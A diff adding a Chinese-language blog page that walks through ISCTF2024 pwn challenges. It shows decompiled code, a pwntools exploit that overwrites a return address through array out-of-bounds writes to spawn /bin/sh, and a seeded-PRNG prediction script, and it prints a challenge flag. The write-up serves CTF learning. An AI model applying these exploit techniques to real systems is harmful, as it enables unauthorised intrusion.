@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>haoo&#39;s tech blog - ISCTF2024</title>
+<meta name="description" content="Netcat通过题目描述可以知道，这是一道nc题目，那就直接连接一下看看 easy pwn!just have funISCTF&amp;#123;5033fc9a-b09c-4fd3-8551-0cb22283d299&amp;#125; OK，直接给flag，那就没什么说的了。 girlfriend先看一下开启了哪些保护 [*] ">
+<meta name="theme-color" content="#090c0b">
+<meta name="color-scheme" content="dark">
+<script>
+  (function () {
+    try {
+      var palette = localStorage.getItem('startrace-palette');
+      if (['green', 'cyan', 'amber'].includes(palette)) document.documentElement.dataset.palette = palette;
+    } catch (error) {}
+  })();
+</script>
+<link rel="stylesheet" href="/css/main.css">
+
+  <link rel="alternate" type="application/rss+xml" title="haoo&#39;s tech blog RSS" href="/rss.xml">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body class="site-body">
+  
+  <header class="site-header">
+  <a class="skip-link" href="#main-content">跳到正文</a>
+  <div class="site-header__inner">
+    <a class="site-brand" href="/" aria-label="haoo&#39;s tech blog 首页">
+      <span class="site-brand__mark" aria-hidden="true">0x</span>
+      <span class="site-brand__text">
+        <strong>haoo&#39;s tech blog</strong>
+      </span>
+    </a>
+
+    <nav id="site-nav" class="site-nav" aria-label="主导航">
+      
+      
+        <a class="site-nav__link" href="/">首页</a>
+      
+        <a class="site-nav__link" href="/archives">文章</a>
+      
+        <a class="site-nav__link" href="/categories">知识库</a>
+      
+        <a class="site-nav__link" href="/tags">标签</a>
+      
+        <a class="site-nav__link" href="/about">关于</a>
+      
+        <a class="site-nav__link" href="/links">链接</a>
+      
+        <a class="site-nav__link" href="/rss.xml">RSS</a>
+      
+    </nav>
+
+    <button class="command-toggle" type="button" data-command-open aria-label="打开命令行" aria-keyshortcuts="Control+K">
+      <span aria-hidden="true">&gt;_</span>
+      <span>Console</span>
+      <kbd>Ctrl K</kbd>
+    </button>
+
+    <button class="palette-toggle" type="button" data-palette-toggle aria-label="切换主题配色" title="切换主题配色">
+      <span class="palette-toggle__swatch" aria-hidden="true"></span>
+      <span data-palette-label>绿色</span>
+    </button>
+
+    <button class="menu-toggle" type="button" aria-label="打开导航" aria-expanded="false" aria-controls="site-nav">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
+  </div>
+  <div class="reading-progress" aria-hidden="true"><span></span></div>
+</header>
+
+
+  <main id="main-content" class="site-main article-main">
+    <article class="article-wrap">
+      <header class="article-header">
+        <div class="post-meta">
+          <span>3133 字</span>
+        </div>
+        <h1>ISCTF2024</h1>
+        
+          <div class="tag-list">
+            
+              <a class="tag-chip tag-chip--solid" href="/categories/ctf/">ctf</a>
+            
+            
+              <a class="tag-chip" href="/tags/ctf/">ctf</a>
+            
+          </div>
+        
+      </header>
+
+      <div class="article-grid">
+        <div class="article-body article-prose" id="article-content">
+          <h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p>通过题目描述可以知道，这是一道nc题目，那就直接连接一下看看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">easy pwn!<br>just have fun<br>ISCTF&#123;5033fc9a-b09c-4fd3-8551-0cb22283d299&#125;<br></code></pre></td></tr></table></figure>
+
+<p>OK，直接给flag，那就没什么说的了。</p>
+<h1 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h1><p>先看一下开启了哪些保护</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/ISCTF2024/girlfriend&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>很常规，放入ida中进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE buf[40]; // [rsp+0h] [rbp-30h] BYREF<br>  char s1[8]; // [rsp+28h] [rbp-8h] BYREF<br><br>  init(argc, argv, envp);<br>  puts(&quot;welcome to isctf2024&quot;);<br>  puts(&quot;first i need your team id&quot;);<br>  read(0, buf, 0x30u);<br>  if ( strcmp(s1, &quot;admin&quot;) )<br>  &#123;<br>    puts(&quot;no no no&quot;);<br>    exit(0);<br>  &#125;<br>  puts(&quot;ok, go on&quot;);<br>  vuln();<br>  return 0;<br>&#125;<br>__int64 vuln()<br>&#123;<br>  __int64 result; // rax<br>  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF<br>  __int64 n7; // [rsp+28h] [rbp-8h]<br><br>  for ( n7 = 0; n7 &lt;= 7; ++n7 )<br>  &#123;<br>    printf(&quot;please input your %d girlfriend birthday\n&quot;, n7 + 1);<br>    result = __isoc99_scanf(&quot;%ld&quot;, &amp;v1[n7]);<br>  &#125;<br>  return result;<br>&#125;<br>int amaze()<br>&#123;<br>  return system(&quot;/bin/sh&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看起来挺有意思的，这道题目并不是传统的栈溢出，这道题目要使用数组越界修改返回地址。首先先利用栈上的输入修改s1的值为”admin\x00”，从而能够进入vuln函数。分析一下进入vuln函数后栈上的分布，在v1[5]处存放的是n7，v1[6]存放的是rbp，v1[7]存放的是返回地址，所以先输入5次后要注意下如何修改n7的值，还有一点就是这道题要输入整形，所以得将16进制数改为10进制数。exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">amaze = 0x401216<br>ret = 0x000000000040101a<br>payload = cyclic(0x28) + b&quot;admin\x00&quot;<br>sl(payload)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;1&quot;)<br>sl(b&quot;5&quot;)<br>sl(b&quot;0&quot;)<br>sl(b&quot;4198942&quot;)<br></code></pre></td></tr></table></figure>
+
+<h1 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h1><p>依然先看一下开启了哪些保护</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/ISCTF2024/ez_game/ez_game&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>放入ida中进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  int v4; // [rsp+Ch] [rbp-1A4h] BYREF<br>  _BYTE v5[400]; // [rsp+10h] [rbp-1A0h] BYREF<br>  unsigned int seed; // [rsp+1A0h] [rbp-10h]<br>  int v7; // [rsp+1A8h] [rbp-8h]<br>  int n20000; // [rsp+1ACh] [rbp-4h]<br><br>  init(argc, argv, envp);<br>  seed = 1;<br>  puts(&quot;Welcome to ISCTF&#x27;s pwn mini-game.&quot;);<br>  puts(&quot;This procedure is only 15 seconds&quot;);<br>  signal(14, handle_sigalrm);<br>  alarm(0xFu);<br>  printf(&quot;Enter your username: &quot;);<br>  gets(v5);<br>  srand(seed);<br>  for ( n20000 = 0; n20000 &lt;= 20000; ++n20000 )<br>  &#123;<br>    v7 = rand() % 7 + 1;<br>    printf(&quot;Round %d\n&quot;, n20000 + 1);<br>    printf(&quot;Please enter the number you want to guess: &quot;);<br>    __isoc99_scanf(&quot;%d&quot;, &amp;v4);<br>    if ( v7 != v4 )<br>    &#123;<br>      puts(&quot;Wrong, goodbye&quot;);<br>      exit(1);<br>    &#125;<br>    puts(&quot;Congratulations, you win!&quot;);<br>  &#125;<br>  getshell();<br>  return 0;<br>&#125;<br>int getshell()<br>&#123;<br>  puts(&quot;It&#x27;s your reward, take advantage of it.&quot;);<br>  return system(&quot;/bin/sh&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>是一道猜数的题目，尽管这道题目给了明显的栈溢出函数gets，但是由于这是在猜数循环前的，因此无法利用这个栈溢出。这道题目考查的就是伪随机数，这里就直接上exp了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">libc = ctypes.CDLL(libc_file)<br>libc.srand(1)<br><br>payload = b&#x27;a\n&#x27;<br>for _ in range(0x4e21):   # 20001<br>    payload += str(libc.rand() % 7 + 1).encode() + b&#x27;\n&#x27;<br>s(payload)<br></code></pre></td></tr></table></figure>
+
+<h1 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h1>
+        </div>
+
+        
+          <aside class="toc-panel" aria-label="文章目录">
+            <div class="toc-panel__head">
+              <h2>目录</h2>
+              <button class="toc-top" type="button">顶部</button>
+            </div>
+            <nav id="toc"></nav>
+          </aside>
+        
+      </div>
+
+      <nav class="article-nav" aria-label="文章导航">
+        
+          <a href="/PolarCTF-pwn%E9%9D%B6%E5%9C%BA/">
+            <span>上一篇</span>
+            <strong>PolarCTF_pwn靶场</strong>
+          </a>
+        
+        
+          <a href="/ISCTF2025/">
+            <span>下一篇</span>
+            <strong>ISCTF2025</strong>
+          </a>
+        
+      </nav>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>15 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p>&copy; haoo · powered by Hexo</p>
+  </div>
+</footer>
+<dialog
+  id="command-console"
+  class="command-console"
+  aria-labelledby="command-title"
+  data-search-url="/search.json"
+  data-home-url="/"
+  data-archives-url="/archives"
+  data-categories-url="/categories"
+  data-tags-url="/tags"
+  data-about-url="/about"
+  data-links-url="/links"
+  data-has-posts="true"
+>
+  <div class="command-console__bar">
+    <div>
+      <span class="command-console__status" aria-hidden="true"></span>
+      <strong id="command-title">haoo@blog:~</strong>
+    </div>
+    <button class="command-console__close" type="button" data-command-close aria-label="关闭命令行">ESC</button>
+  </div>
+
+  <div id="command-output" class="command-console__output" role="log" aria-live="polite" aria-relevant="additions">
+    <div class="command-message command-message--accent">Startrace interactive shell v1.0</div>
+    <div class="command-message">输入 <code>help</code> 查看命令，按 <kbd>Ctrl K</kbd> 随时打开。</div>
+  </div>
+
+  <form id="command-form" class="command-console__form" autocomplete="off">
+    <label for="command-input"><span aria-hidden="true">visitor@blog:~$</span><span class="visually-hidden">输入命令</span></label>
+    <input id="command-input" name="command" type="text" inputmode="text" autocapitalize="off" spellcheck="false" aria-describedby="command-hint">
+    <span class="command-console__cursor" aria-hidden="true"></span>
+  </form>
+  <p id="command-hint" class="command-console__hint">help · ls · cd · open · search · clear</p>
+</dialog>
+
+<script src="/js/theme.js" defer></script>
+
+</body>
+</html>
